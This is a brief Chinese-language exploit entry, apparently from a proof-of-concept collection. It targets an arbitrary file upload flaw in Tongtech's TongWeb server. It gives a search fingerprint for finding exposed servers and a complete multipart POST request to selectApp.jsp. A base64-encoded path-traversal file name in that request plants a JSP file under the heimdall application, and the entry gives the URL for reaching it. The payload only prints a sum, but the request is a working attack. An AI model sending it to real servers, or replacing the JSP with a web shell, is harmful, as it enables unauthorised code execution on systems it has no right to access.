# 东方通TongWeb-selectApp.jsp存在任意文件上传

- **系统**：东方通　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`header="TongWeb Server"`
- **请求**：`POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=fa2ef860e94d564632e291131d2006…`

**请求体 / payload**
```
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app_fileName"
Li4vLi4vYXBwbGljYXRpb25zL2hlaW1kYWxsLzEyM3F3ZTEuanNw
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app"
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="className"
test
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="uploadApp"; filename="test.jar"
Content-Type: application/java-archive
<% out.println(16156223+223415616); %>
--fa2ef860e94d564632e291131d20064c--
http://ip/heimdall/123qwe1.jsp
```